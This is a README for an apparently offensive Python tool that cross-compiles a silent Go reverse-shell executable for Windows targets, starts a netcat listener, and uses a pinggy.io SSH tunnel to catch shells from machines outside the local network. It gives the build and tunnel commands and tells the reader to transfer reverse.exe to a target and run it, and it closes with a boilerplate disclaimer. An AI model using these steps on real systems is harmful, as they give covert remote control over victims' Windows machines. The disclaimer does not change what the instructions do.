# Go Reverse Shell Automator

A Python script that automates the configuration and cross-compilation of a Go-based reverse shell for Windows targets. It generates a standalone `.exe` payload that runs silently in the background and automatically starts a listener to catch the incoming connection.

## Features

- Automates payload generation for Windows (`.exe`).
- Runs silently in the background on the target machine (no console window).
- Cross-compiles from Linux/macOS for Windows targets.
- Automatically starts a `netcat` listener.
- Configurable IP and Port via command-line arguments.

## Prerequisites

Before using this tool, you must have the following software installed and available in your system's PATH:

- **Python 3**: The script is written in Python 3.
- **Go**: The Go compiler is required to build the payload.
- **Netcat**: `nc` is used to listen for the incoming connection.

## Usage Steps (Local Network)

1.  **Configure and Build**
    
    Run the `GW.py` script, providing your listener's IP address and a port. The script will configure the source code, compile the payload, and start the listener.
    
    ```bash
    python3 GW.py --ip <YOUR_LISTENER_IP> --port <PORT>
    ```
    
    **Example:**
    
    ```bash
    python3 GW.py --ip 192.168.1.100 --port 8080
    ```

## Usage for Online Shells (via Tunneling)

To get a reverse shell from a target outside your local network, you need a public address. This can be achieved using a tunneling service like `pinggy.io`. This method requires the modified version of `GW.py` that accepts a separate `--lport` argument.

**Step 1: Start the Tunnel**

In one terminal, start the `pinggy.io` TCP tunnel. This will provide a public hostname and port that will forward traffic to your local listener. Keep this terminal running.

```bash
ssh -p 443 -R0:localhost:8080 tcp@free.pinggy.io
```

Look for the output line that starts with `tcp://`. It will give you a public `<hostname>` and `<port>`. For example: `tcp://some-name.pinggy.link:42809`.

**Step 2: Configure, Build, and Listen**

In a **new terminal**, run the `GW.py` script with the details from the tunnel. This single command will configure the payload with the public address, compile it, and start the listener on your required local port (`8080`).

Use the hostname and port from Step 1 in the command below:

```bash
python3 GW.py --ip <hostname-from-pinggy> --port <port-from-pinggy> --lport 8080
```

**Example:**

If `pinggy.io` gives you `tcp://some-name.pinggy.link:42809`, the command would be:

```bash
python3 GW.py --ip some-name.pinggy.link --port 42809 --lport 8080
```

**Step 3: Deploy and Execute**

The script will generate `reverse.exe`. Transfer this file to your target machine and execute it.

**Step 4: Catch the Shell**

The reverse shell will connect to the `pinggy.io` address, which will forward the connection to your `GW.py` script's listener. You will now have a shell session in the terminal where you ran `GW.py`.

## Disclaimer

This tool is intended for educational purposes and authorized security testing only. Unauthorized use of this tool on systems you do not own or have explicit permission to test is illegal. The author is not responsible for any misuse or damage caused by this tool.
